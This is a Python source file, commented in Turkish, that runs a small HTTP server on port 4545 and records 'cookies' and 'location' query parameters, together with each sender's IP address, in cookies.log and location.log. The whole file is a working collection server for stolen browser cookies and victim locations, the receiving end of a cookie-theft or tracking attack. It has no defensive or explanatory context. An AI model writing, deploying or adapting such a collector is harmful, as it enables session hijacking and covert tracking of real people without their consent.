from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import json
import time
import logging
import sys

class RequestHandler(BaseHTTPRequestHandler):
    """HTTP İstekleri İşleme Sınıfı"""

    def do_GET(self):
        """Gelen GET isteklerini işler"""
        try:
            # İstek yapılan URL'yi ve parametreleri ayrıştırma
            parsed_url = urllib.parse.urlparse(self.path)
            query_params = urllib.parse.parse_qs(parsed_url.query)

            # İstek bilgilerini ve kullanıcı IP adresini yazdırma
            client_ip = self.client_address[0]
            logging.info(f"Client IP: {client_ip}")
            logging.info(f"Path: {self.path}")
            logging.info(f"Query Parameters: {query_params}")

            # Çerez verilerini kontrol etme
            cookies = query_params.get('cookies', [])
            if cookies:
                logging.info(f"Received Cookies: {cookies}")
                with open("cookies.log", "a") as log_file:
                    log_file.write(f"{time.ctime()} - IP: {client_ip} - Cookies: {cookies}\n")

            # Konum bilgisini alma
            location = query_params.get('location', [])
            if location:
                logging.info(f"User Location: {location}")
                with open("location.log", "a") as log_file:
                    log_file.write(f"{time.ctime()} - IP: {client_ip} - Location: {location}\n")

            # Başarılı yanıt gönderme
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"GET request received and logged.")
        except Exception as e:
            logging.error(f"An error occurred: {e}")
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"Internal Server Error")

def run(server_class=HTTPServer, handler_class=RequestHandler, port=4545):
    """HTTP sunucusunu çalıştırır"""
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)

    logging.info(f"Server running on port {port}")
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        logging.info("Exiting....")
        sys.exit()
    except Exception as e:
        logging.error(e)

if __name__ == '__main__':
    run()
